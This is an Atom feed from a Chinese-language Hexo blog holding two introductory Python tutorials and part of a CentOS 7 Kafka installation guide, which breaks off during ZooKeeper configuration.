<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>故园遗剑</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-09-24T14:41:24.325Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>mys3t</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python-基础2</title>
    <link href="http://yoursite.com/2020/09/22/Python-%E5%9F%BA%E7%A1%802/"/>
    <id>http://yoursite.com/2020/09/22/Python-基础2/</id>
    <published>2020-09-22T05:54:58.000Z</published>
    <updated>2020-09-24T14:41:24.325Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h1><h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><p>Python的基本数据类型有下列几种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">数值数据类型：常见的数值数据又可分成整数(int)和浮点数(float）</span><br><span class="line"></span><br><span class="line">布尔值(Boolean)数据类型</span><br><span class="line"></span><br><span class="line">字符串(string)数据类型</span><br></pre></td></tr></table></figure><h4 id="查看数据类型type"><a href="#查看数据类型type" class="headerlink" title="查看数据类型type"></a>查看数据类型type</h4><p>type( )函数可以列出变量的数据类型类别。</p><h4 id="整数与浮点数的运算"><a href="#整数与浮点数的运算" class="headerlink" title="整数与浮点数的运算"></a>整数与浮点数的运算</h4><p>Python具有简单自动转换能力，在计算时会将整数转换为浮点数再执行运算。</p><p>如不同数据类型的运算：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924213432821.png" alt="image-20200924213432821"></p><p>执行结果为：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924213517737.png" alt="image-20200924213517737"></p><h4 id="进位与函数"><a href="#进位与函数" class="headerlink" title="进位与函数"></a>进位与函数</h4><p>Python中定义凡是0b开头的数字，代表这是2进位的整数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin()函数可以将一般数字转换为2进位</span><br></pre></td></tr></table></figure><p>Python中定义凡是0o开头的数字，代表这是8进位的整数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oct()函数可以将一般数字转换为8进位</span><br></pre></td></tr></table></figure><p>Python中定义凡是0x开头的数字，代表这是16进位的整数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex()函数可以将一般数字转换为16进位</span><br></pre></td></tr></table></figure><h4 id="强制数据类型转换"><a href="#强制数据类型转换" class="headerlink" title="强制数据类型转换"></a>强制数据类型转换</h4><p>int( )：将数据类型强制转换为整数。</p><p>float( )：将数据类型强制转换为浮点数。</p><p>如将浮点数强制转换为整数的运算：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924214228593.png" alt="image-20200924214228593"></p><p>运算结果：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924214254420.png" alt="image-20200924214254420"></p><h4 id="数值运算常用函数"><a href="#数值运算常用函数" class="headerlink" title="数值运算常用函数"></a>数值运算常用函数</h4><p>abs()：计算绝对值。</p><p>pow(x,y)：返回x的y次方。</p><p>round()：返回四舍六入，不是四舍五入。</p><h4 id="布尔值类型"><a href="#布尔值类型" class="headerlink" title="布尔值类型"></a>布尔值类型</h4><p>Python的布尔值(Boolean)数据类型的值有两种，True(真)或False(伪)，它的数据类型代号是bool。这个布尔值一般是应用在程序流程的控制，特别是在条件表达式中。</p><p>如果将布尔值数据类型强制转换成整数，当原值是True，将得到1；当原值是False，将得到0。</p><p>如将布尔值强制转换为整数，同时列出转换的结果：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924214812881.png" alt="image-20200924214812881"></p><p>执行结果：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924214839869.png" alt="image-20200924214839869"></p><h4 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h4><p>字符串(string)数据是指两个单引号(‘)之间或是两个双引号(“)之间任意个数字元符号的数据，它的数据类型代号是str。</p><p>数学的运算符“+”，可以执行两个字符串相加，产生新的字符串。</p><p>str( )函数可以强制将数值数据转换为字符串数据。</p><p>使用单引号与双引号设定与输出字符串数据：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924215013609.png" alt="image-20200924215013609"></p><p>执行结果：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924215041213.png" alt="image-20200924215041213"></p><p>在处理多于一行的字符串时，可以使用三个单引号（或是三个双引号）将字符串包夹。</p><h5 id="关于逸出字符"><a href="#关于逸出字符" class="headerlink" title="关于逸出字符"></a>关于逸出字符</h5><p>在字符串使用中，如果字符串内有一些特殊字符，如单引号、双引号等，必须在此特殊字符前加上“\”(反斜杠)，才可正常使用，这种含有“\”符号的字符称逸出字符(Escape Character)。如下表：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924215517313.png" alt="image-20200924215517313"></p><p>字符串使用中特别是碰到字符串含有单引号时，如果是使用单引号定义这个字符串时，必须要使用此逸出字符，才可以顺利显示。</p><h5 id="字符串数据的转换"><a href="#字符串数据的转换" class="headerlink" title="字符串数据的转换"></a>字符串数据的转换</h5><p>如果字符串含一个字符或一个文字时，可以使用下列执行数据的转换：</p><p>chr( x )：可以返回函数x值的字符，x是ASCII码值。</p><p>ord( x )：可以返回函数字符参数的Unicode码值，如果是中文字也可传回Unicode码值。如果是英文字符，Unicode码值与ASCII码值是一样的。</p><p>在Python可以允许将字符串与整数相乘，结果是字符串将重复该整数的次数。如下：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924215902501.png" alt="image-20200924215902501"></p><p>执行结果：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924215932287.png" alt="image-20200924215932287"></p><p>有时设计程序时，想将字符串分行输出，可以使用字符串加法功能，在加法过程中加上换行字符“\n”即可产生字符串分行输出的结果。</p><h5 id="字符串前加r"><a href="#字符串前加r" class="headerlink" title="字符串前加r"></a>字符串前加r</h5><p>在使用Python时，如果在字符串前加上r，可以防止逸出字符(Escape Character)被转译。</p><h2 id="基本输入与输出"><a href="#基本输入与输出" class="headerlink" title="基本输入与输出"></a>基本输入与输出</h2><p>help( )函数可以列出某一个Python的指令或函数的使用说明。</p><h4 id="格式化输出print"><a href="#格式化输出print" class="headerlink" title="格式化输出print"></a>格式化输出print</h4><p>在使用格式化输出时，基本使用格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print（“输出格式区” % （变量系列区））</span><br></pre></td></tr></table></figure><p>可以放置变量系列区对应的格式化字符，基本意义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">%d：格式化整数输出</span><br><span class="line"></span><br><span class="line">%s：格式化字符串输出</span><br><span class="line"></span><br><span class="line">%f：格式化浮点数输出</span><br><span class="line"></span><br><span class="line">%x：格式化16进制输出</span><br><span class="line"></span><br><span class="line">%o：格式化8进制输出</span><br></pre></td></tr></table></figure><h4 id="精准格式化输出"><a href="#精准格式化输出" class="headerlink" title="精准格式化输出"></a>精准格式化输出</h4><p>print( )函数在格式化过程中，有提供功能可以设定保留多少格的空间让资料做输出，语法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">%(+|-)nd：格式化整数输出</span><br><span class="line"></span><br><span class="line">%(+|-)m.nf：格式化浮点数输出</span><br><span class="line"></span><br><span class="line">%(+|-)nx：格式化16进位整数输出</span><br><span class="line"></span><br><span class="line">%(+|-)no：格式化8进位整数输出</span><br><span class="line"></span><br><span class="line">%(-)ns：格式化字符串输出</span><br></pre></td></tr></table></figure><p>对浮点数而言，m代表保留多少格数供输出（包含小数点），n则是小数数据保留格数。至于其他的数据格式n则是保留多少格数空间，如果保留格数空间不足将完整输出数据，如果保留格数空间太多则数据靠右对齐。</p><p>如果格式化数值数据有加上负号(-)，表示保留格数空间有多时，数据将靠左输出。如果格式化数值数据有加上正号(+)，表示输出数据是正值时，将在左边加上正值符号。</p><h4 id="format函数"><a href="#format函数" class="headerlink" title="format函数"></a>format函数</h4><p>字符串使用format方法做格式化的动作，基本使用格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;输出格式区&quot; .format(&quot;变量系列区&quot;))</span><br></pre></td></tr></table></figure><p>在输出格式区内的字符串变量使用“{ }”表示。</p><h4 id="输出数据到文件"><a href="#输出数据到文件" class="headerlink" title="输出数据到文件"></a>输出数据到文件</h4><h5 id="打开一个文件open"><a href="#打开一个文件open" class="headerlink" title="打开一个文件open"></a>打开一个文件open</h5><p>open( )函数可以打开一个文件供读取或写入，如果这个函数执行成功，会传回文件对象，这个函数的基本使用格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_open&#x3D;open(file,mode&#x3D;&quot;r&quot;)</span><br></pre></td></tr></table></figure><p>mode代表写入模式，基本的模式有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">“r”：这是预设，打开文件供读取(read)。</span><br><span class="line"></span><br><span class="line">“w”：打开文件供写入，如果原先文件有内容将被覆盖。</span><br><span class="line"></span><br><span class="line">“a”：打开文件供写入，如果原先文件有内容，新写入数据将附加在后面。</span><br><span class="line"></span><br><span class="line">“x”：打开一个新的文件供写入，如果所打开的文件已经存在会产生错误。</span><br><span class="line"></span><br><span class="line">“b”：以二进制模式打开文件。</span><br><span class="line"></span><br><span class="line">“t”：打开本文(txt)文件模式，这是默认。</span><br><span class="line"></span><br><span class="line">“+”：打开文件供更新用。</span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f1&#x3D;open(&quot;d:\1.txt&quot;,mode&#x3D;&quot;w&quot;)</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure><h4 id="数据输入input"><a href="#数据输入input" class="headerlink" title="数据输入input"></a>数据输入input</h4><p>input( )函数功能与print( )函数功能相反，这个函数会从屏幕读取用户从键盘输入的数据，它的使用格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value&#x3D;input(&quot;promt:&quot;)</span><br></pre></td></tr></table></figure><p>value是变量，所输入的数据会存储在此变量内，特别需注意的是所输入的数据不论是字符串或是数值数据返回到value时一律是字符串数据，如果要执行数学运算需要用int( )函数转换为整数。</p><p>基本数据输入与运算示例：</p><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924223817769.png" alt="image-20200924223817769"></p><h4 id="列出所有内置函数dir"><a href="#列出所有内置函数dir" class="headerlink" title="列出所有内置函数dir"></a>列出所有内置函数dir</h4><p>可以使用下列方式列出Python所提供的内置函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir(_ _builtins_ _) 列出python内置函数</span><br></pre></td></tr></table></figure><p><img src="/2020/09/22/Python-%E5%9F%BA%E7%A1%802/image-20200924224110041.png" alt="image-20200924224110041"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python-基础1</title>
    <link href="http://yoursite.com/2020/09/18/Python-%E5%9F%BA%E7%A1%801/"/>
    <id>http://yoursite.com/2020/09/18/Python-基础1/</id>
    <published>2020-09-18T05:16:44.000Z</published>
    <updated>2020-09-18T06:24:59.764Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918134047614.png" alt="image-20200918134047614"></p><h1 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h1><h2 id="关于python"><a href="#关于python" class="headerlink" title="关于python"></a>关于python</h2><p>Python是一种直译式(Interpreted )、面向对象(Object Oriented )的程序语言，所谓的直译式语言是指，直译器(Interpretor)会将程序代码一句一句直接执行，不需要经过编译(compile)动作，将语言先转换成机器码，再予以执行。目前它的直译器是CPython，这是由C语言编写的一个直译程序。</p><p>Python的最初设计者是吉多·范罗姆苏(Guido van Rossum)，目前Python语言是由Python软件基金会管理，有关新版软件的相关信息可以在这个基金会网址(<a href="http://www.python.org)上下载浏览。" target="_blank" rel="noopener">www.python.org)上下载浏览。</a></p><p>2000年10月16日Python 2.0正式发表，主要是增加了垃圾回收的功能，同时支持Unicode。2008年12月3日Python 3.0正式发表，Python 2.7x已经被确定为最后一个Python 2.x的版本。</p><p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918134202904.png" alt="image-20200918134202904"></p><p>Python是一种跨平台的程序语言，几乎主要操作系统，例如，Windows、MacOS、UNIX/LINUX等，皆可以安装和使用，可以在某一个平台上使用Python设计一个程序，未来这个程序也可以在其他平台上顺利运作。</p><h2 id="python的应用"><a href="#python的应用" class="headerlink" title="python的应用"></a>python的应用</h2><p>python的应用范围很广，部分应用范围为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">设计动画游戏</span><br><span class="line"></span><br><span class="line">支持图形接口(Graphical User Interface，GUI)开发</span><br><span class="line"></span><br><span class="line">开发与管理网站</span><br><span class="line"></span><br><span class="line">执行大数据分析</span><br><span class="line"></span><br><span class="line">企业内部开发工具</span><br><span class="line"></span><br><span class="line">黑客攻防</span><br></pre></td></tr></table></figure><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>程序注释主要功能是让你所设计的程序可读性更高，更容易了解。</p><h4 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a>注释符号</h4><p>“#”符号右边的文字，称程序注释，Python语言的直译器会忽略此符号右边的文字。</p><h4 id="单引号或双引号"><a href="#单引号或双引号" class="headerlink" title="单引号或双引号"></a>单引号或双引号</h4><p>如果要进行大段落的注释，可以用三个单引号或双引号将注释文字包夹。</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量是一个暂时存储数据的地方，在Python中可以用“=”等号设定变量的内容。</p><h4 id="变量的命名规则"><a href="#变量的命名规则" class="headerlink" title="变量的命名规则"></a>变量的命名规则</h4><p>Python对于变量的命名有一些规则要遵守，否则会造成程序错误。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">必须由英文字母、_(下画线)或中文字开头，建议使用英文字母</span><br><span class="line"></span><br><span class="line">变量名称只能由英文字母、数字、_(下画线)或中文字所组成</span><br><span class="line"></span><br><span class="line">英文字母大小写是敏感的，例如，Name与name被视为不同变量名称</span><br><span class="line"></span><br><span class="line">Python系统保留字（或称关键词）或Python内置函数名称不可当作变量名称</span><br></pre></td></tr></table></figure><p>下列是不可当作变量名称的Python系统保留字</p><p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918134656457.png" alt="image-20200918134656457"></p><p>下列是不可当作变量名称的Python系统内置函数</p><p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918134858584.png" alt="image-20200918134858584"></p><p>不合法变量示例</p><p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918135000191.png" alt="image-20200918135000191"></p><h2 id="基本数学运算"><a href="#基本数学运算" class="headerlink" title="基本数学运算"></a>基本数学运算</h2><h4 id="四则运算"><a href="#四则运算" class="headerlink" title="四则运算"></a>四则运算</h4><p>四则运算是指加( + )、减( - )、乘( × )和除( / )。</p><p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918135802081.png" alt="image-20200918135802081"></p><h4 id="余数和整除"><a href="#余数和整除" class="headerlink" title="余数和整除"></a>余数和整除</h4><p>余数(mod)所使用的符号是“%”，可计算出除法运算中的余数。整除所使用的符号是“//”，是指除法运算中只保留整数部分。</p><p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918140437516.png" alt="image-20200918140437516"></p><h4 id="次方"><a href="#次方" class="headerlink" title="次方"></a>次方</h4><p>次方的符号是“ ** ”。</p><p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918140547002.png" alt="image-20200918140547002"></p><h4 id="运算的优先级"><a href="#运算的优先级" class="headerlink" title="运算的优先级"></a>运算的优先级</h4><p>Python语言碰上计算式同时出现在一个指令内时，除了括号“ (”、“)”最优先外，其余计算优先次序如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.次方</span><br><span class="line"></span><br><span class="line">2.乘法、除法、求余数(%)、求整数(&#x2F;&#x2F;)，彼此依照出现顺序运算</span><br><span class="line"></span><br><span class="line">3.加法、减法，彼此依照出现顺序运算</span><br></pre></td></tr></table></figure><h4 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h4><p>常见的赋值运算符如下：</p><p><img src="/2020/09/18/Python-%E5%9F%BA%E7%A1%801/image-20200918141445718.png" alt="image-20200918141445718"></p><h4 id="等号的多重指定使用"><a href="#等号的多重指定使用" class="headerlink" title="等号的多重指定使用"></a>等号的多重指定使用</h4><p>使用Python时，可以一次设定多个变量等于某一数值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x&#x3D;y&#x3D;z&#x3D;10</span><br><span class="line">x&#x3D;10</span><br><span class="line">y&#x3D;10</span><br><span class="line">z&#x3D;10</span><br></pre></td></tr></table></figure><p>Python也允许多个变量同时指定不同的数值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x,y,z &#x3D;10,20,30</span><br><span class="line">x&#x3D;10</span><br><span class="line">y&#x3D;20</span><br><span class="line">z&#x3D;30</span><br></pre></td></tr></table></figure><p>将2个变量内容交换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x,y&#x3D;10,20</span><br><span class="line">x,y&#x3D;y,x</span><br><span class="line">x&#x3D;20</span><br><span class="line">y&#x3D;10</span><br></pre></td></tr></table></figure><h4 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h4><p>程序设计时，如果某个变量不再需要，可以使用del指令将此变量删除，相当于可以收回原变量所占的内存空间，以节省内存空间。</p><p>删除格式为：del 变量名称</p><h4 id="python的断行"><a href="#python的断行" class="headerlink" title="python的断行"></a>python的断行</h4><p>将一个语句分成多行：</p><p>碰上一个语句很长，需要分成2行或更多行撰写，此时可以在叙述后面加上“\”符号，Python解释器会将下一行的语句视为这一行的语句。特别注意，在“\”符号右边不可加上任何符号或文字，即使是注释符号也不允许。</p><p>也可以在语句内使用小括号，如果使用小括号，就可以在语句右边加上注释符号。</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>CentOS7安装kafka</title>
    <link href="http://yoursite.com/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/"/>
    <id>http://yoursite.com/2020/08/02/CentOS7安装kafka/</id>
    <published>2020-08-02T10:11:31.000Z</published>
    <updated>2020-08-04T15:38:21.506Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="CentOS7下安装kafka"><a href="#CentOS7下安装kafka" class="headerlink" title="CentOS7下安装kafka"></a>CentOS7下安装kafka</h1><h2 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h2><p>Kafka 服务端代码是用 Scala 开发语言编写的，Scala 是 JVM 系语言中的一种，这意味着用 Scala 编写的源代码编译之后也是 Java 字节码，并运行在 Java 虚拟机上。因此，在开始安装 Kafka 之前，我们需要先在系统上安装 JDK（Java SE Development Kit， Java SE开发套件），JDK 包含的 JRE（Java SE Runtime Environment，Java 运行时环境）是运行 Java 应用程序所必需的。</p><p>多数情况下，推荐安装 JDK 8 及以上的版本，因为 Kafka 自 2.0.0 版本开始，就已经正式摒弃对 Java 7 的支持了。另外，运行 Kafka 还需要安装 Apache ZooKeeper 服务，该服务是用来同步分布式进程。</p><h2 id="安装JDK"><a href="#安装JDK" class="headerlink" title="安装JDK"></a>安装JDK</h2><h4 id="1、环境"><a href="#1、环境" class="headerlink" title="1、环境"></a>1、环境</h4><p>操作系统：centos7.4</p><p>安装包版本： jdk-8u221-linux-x64.tar.gz</p><h4 id="2、卸载系统自带-OpenJDK"><a href="#2、卸载系统自带-OpenJDK" class="headerlink" title="2、卸载系统自带 OpenJDK"></a>2、卸载系统自带 OpenJDK</h4><p>如果 CentOS 系统中集成了 OpenJDK，那么需要先卸载自带的 OpenJDK 才能安装标准版 JDK，卸载具体步骤如下：</p><p>1、系统终端输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep java</span><br></pre></td></tr></table></figure><p>若系统中集成了 OpenJDK，会出现 xxxx_openjdk_xxxx 的信息；</p><p>2、删除 OpenJDK：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -e --nodeps rpm -qa | grep java</span><br></pre></td></tr></table></figure><h4 id="3、安装JDK1-8"><a href="#3、安装JDK1-8" class="headerlink" title="3、安装JDK1.8"></a>3、安装JDK1.8</h4><p>1、将下载的安装包使用winscp拷贝至服务器<code>/usr/local/src</code>目录下。</p><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802182606968.png" alt="image-20200802182606968"></p><p>2、新建JDK安装目录 <code>/usr/local/java</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir &#x2F;usr&#x2F;local&#x2F;java</span><br></pre></td></tr></table></figure><p>3、解压文件 jdk-8u221-linux-x64.tar.gz 至安装目录 /usr/local/java</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf jdk-8u221-linux-x64.tar.gz -C &#x2F;usr&#x2F;local&#x2F;java</span><br></pre></td></tr></table></figure><p>4、配置环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><p>JAVA_HOME为JDK安装目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_221</span><br><span class="line">export JRE_HOME&#x3D;$&#123;JAVA_HOME&#125;&#x2F;jre</span><br><span class="line">export CLASSPATH&#x3D;.:$&#123;JAVA_HOME&#125;&#x2F;lib:$&#123;JRE_HOME&#125;&#x2F;lib</span><br><span class="line">export PATH&#x3D;$&#123;JAVA_HOME&#125;&#x2F;bin:$PATH</span><br></pre></td></tr></table></figure><p>5、让更新的环境变量生效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><p>6、检测安装是否成功，若安装并配置成功，可以看到以输出；如果得到诸如“-bash: java: 未找到命令 ”就需要退回去反复检査安装和配置步骤是否正确。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802183301282.png" alt="image-20200802183301282"></p><h2 id="安装和配置ZooKeeper"><a href="#安装和配置ZooKeeper" class="headerlink" title="安装和配置ZooKeeper"></a>安装和配置ZooKeeper</h2><h4 id="1、下载安装包"><a href="#1、下载安装包" class="headerlink" title="1、下载安装包"></a>1、下载安装包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;src</span><br><span class="line"></span><br><span class="line">wget http:&#x2F;&#x2F;mirror.bit.edu.cn&#x2F;apache&#x2F;zookeeper&#x2F;zookeeper-3.5.8&#x2F;apache-zookeeper-3.5.8-bin.tar.gz</span><br></pre></td></tr></table></figure><p>输出结果：</p><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802184047139.png" alt="image-20200802184047139"></p><h4 id="2、新建-安装目录"><a href="#2、新建-安装目录" class="headerlink" title="2、新建 安装目录"></a>2、新建 安装目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p &#x2F;usr&#x2F;local&#x2F;zookeeper</span><br></pre></td></tr></table></figure><h4 id="3、解压至zookeeper目录"><a href="#3、解压至zookeeper目录" class="headerlink" title="3、解压至zookeeper目录"></a>3、解压至zookeeper目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;src</span><br><span class="line"></span><br><span class="line">tar zxvf apache-zookeeper-3.5.8-bin.tar.gz -C &#x2F;usr&#x2F;local&#x2F;zookeeper</span><br></pre></td></tr></table></figure><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802184509754.png" alt="image-20200802184509754"></p><h4 id="4、配置zookeeper"><a href="#4、配置zookeeper" class="headerlink" title="4、配置zookeeper"></a>4、配置zookeeper</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;conf</span><br><span class="line">[root@172 conf]# ll</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r--. 1 root root  535 May  4 21:26 configuration.xsl</span><br><span class="line">-rw-r--r--. 1 root root 2712 May  4 21:26 log4j.properties</span><br><span class="line">-rw-r--r--. 1 root root  922 May  4 21:26 zoo_sample.cfg</span><br></pre></td></tr></table></figure><p>1) 复制 zoo_sample.cfg 并重命名为 zoo.cfg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp zoo_sample.cfg zoo.cfg</span><br></pre></td></tr></table></figure><p>2) 创建 ZooKeeper 保存数据目录和保存日志目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;data &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;logs</span><br></pre></td></tr></table></figure><p>3) 修改配置文件 zoo.cfg，修改内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 